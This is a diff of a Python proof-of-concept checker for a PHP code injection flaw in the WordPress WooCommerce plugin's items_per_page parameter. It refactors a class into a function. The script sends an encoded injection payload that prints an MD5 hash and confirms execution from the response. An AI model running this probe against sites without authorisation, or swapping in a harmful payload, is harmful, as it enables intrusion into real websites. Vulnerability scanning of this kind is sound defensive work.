@@ -9,20 +9,13 @@ description: 插件WooCommerce中,参数items_per_page存在PHP代码注入。
 import sys
 import requests
 import warnings
-  
-  
-
-class woocommerce_code_exec:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['wordpress 插件WooCommerce PHP代码注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/produits/?items_per_page=%24%7b%40print(md5(1234))%7d&setListingType=grid"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
@@ -37,5 +30,4 @@ class woocommerce_code_exec:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = woocommerce_code_exec(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
